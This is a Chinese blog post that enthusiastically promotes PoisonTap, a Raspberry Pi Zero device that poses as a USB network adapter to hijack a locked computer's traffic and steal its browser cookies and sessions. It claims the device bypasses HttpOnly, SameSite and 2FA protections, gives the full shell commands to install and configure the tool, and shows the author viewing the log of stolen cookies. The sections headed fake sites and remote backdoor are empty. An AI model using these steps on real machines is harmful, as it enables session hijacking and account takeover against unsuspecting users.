---
title: 30秒内盗取任意PC的Cookie神器 PoisonTap
date: 2016-12-18 18:44:51
tags: Hack 
categories: Hack 
permalink: poisontap
header-img: "/content/images/2016/07/stock-photo-132346157-1.jpg"

---

著名黑阔Samy Kamkar利用Raspberry Pi Zero黑客神器PoisonTap，只需30秒，就可以窃取有任意密码的电脑系统下的Cookie和Session，并实现长期后门安装。PoisonTap不是暴力破解密码，而是绕过密码。

是的，买了Raspberry Pi Zero，有幸尝试了一下这个基于Node的工具，真乃神器。

<!--more-->

# 介绍

PoisonTap 通吃 Windows/Mac/Linux系统。其实现原理十分猥琐。

![](/content/images/poisontap/1.gif)

把自己伪装成有线网卡，一旦插入系统中，众所周知，所有的操作系统的规则都是这样的：

> 有线网络>无线网络

也就是说，如果他连接着Wi-Fi，没关系，系统会以我的伪网卡为最高优先级。在系统处于锁屏状态下，只要有网络通信，无论系统通信哪个都会被强制跳转到我用于 攻击你的页面 ，成批量的窃取你的Cookie和Session。

没错，就是你猜到的MITM，中间人攻击。通过PoisonTap，我们可以：

- 模拟成一个伪USB网卡
- 不需要解锁电脑就可以实现攻击
- 劫持系统所有网络连接的所有流量 包括局域网
- 窃取储存Alexa前一百万的网站的Cookie和Session
- 用远程outbound的方式进行WebSocket或DNS重绑定攻击
- 用HTTP的JS缓存禁止对该PC进行web后门安装，缓存涉及到上千个域名和cdn js缓存供应商
- 截取Cookie后可以使用该PC的Cookie进行登录，实现中间人攻击的最终目标

![](/content/images/poisontap/2.gif)

PoisonTap比你想象的更强大的是，PoisonTap能够突破以下普通MITM办不到的几点：

* 锁屏密码
* 路由表ARP的优先级设置和网络适配器优先级设置
* 同源策略 (Same-Origin Policy)
* X-Frame-Options 响应头攻击
* Cookie的HttpOnly安全设置
* Cookie的SameSite安全属性
* 两步/多步验证密码(2FA/MFA)
* DNS劫持
* 跨域资源共享CORS
* HTTPS cookie 保护

# 安装

接着昨天的零网络配置，我们不需要任何网口 WiFi 蓝牙 就可以完成配置。

注意！配置前请保证`apt-get`命令是可以用的且可以联网的，配置过程中不允许出错，否则会出大问题。

首先，我们在本机下载下来这个神器Poisontap

```bash
git clone https://github.com/samyk/poisontap
```
然后，我们用scp命令把Poisontap传到Raspberry Pi Zero上。
```bash
scp -r poisontap pi@zero.local:~
```
登录到树莓派上，运行
```bash
cd poisontap
echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
echo "dtoverlay=dwc2" >> /boot/config.txt
echo -e "dwc2\ng_ether" >> /etc/modules
sudo sed --in-place "/exit 0/d" /etc/rc.local
echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local
mkdir /home/pi/poisontap
chown -R pi /home/pi/poisontap
apt-get update && apt-get upgrade
apt-get -y install isc-dhcp-server dsniff screen nodejs
```
确保以上都成功后，运行
```bash
sudo cp dhcpd.conf /etc/dhcp/dhcpd.conf
reboot
```
好了，已经安装好了，接下来我们可以Hack啦~
# Hack
## Cookie 和 Session窃取
把配置好的树莓派重新插入电脑里，这时他已经变成了黑阔神器了。

为了使攻击过程可视化，我们访问 www.google.com

![](/content/images/poisontap/4.png)

动画非常炫酷，这时候已经在窃取成千上万的网站的Cookie了，吃个小饼干。

![](/content/images/poisontap/5.png)

打开Chrome的工具看一看，哇。

随后，Cookie都被保存在树莓派里了，我们连接上树莓派的SSH，看一下，成功。

```bash
cat poisontap.cookies.log
```

![](/content/images/poisontap/3.png)

## 伪造网站


## 远程后门


# 参考
https://github.com/samyk/poisontap
